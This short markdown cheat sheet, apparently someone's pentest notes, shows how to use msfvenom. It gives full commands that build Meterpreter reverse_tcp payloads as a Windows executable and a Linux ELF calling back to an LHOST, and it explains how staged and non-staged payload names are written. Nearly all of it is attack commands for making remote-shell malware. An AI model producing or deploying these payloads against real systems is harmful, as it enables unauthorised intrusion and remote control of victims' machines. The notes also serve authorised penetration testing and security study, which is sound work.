# MSFVenom

To see the available payloads: `msfvenom -l payloads`
- Filter by piping to grep
- [Cheat Sheet](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

Build a payload with MSFVenom:

```
# Windows:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[local ip] LPORT=1234 -f exe > payload.exe

# Linux:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[local ip] LPORT=1234 -f elf > payload
```

A staged payload will follow this syntax: 

```
windows/x64/meterpreter/reverse_tcp
linux/x86/meterpreter/reverse_tcp
```

A non-staged payload will follow this syntax: 

```
windows/x64/meterpreter_reverse_tcp
linux/x86/meterpreter_reverse_tcp
```
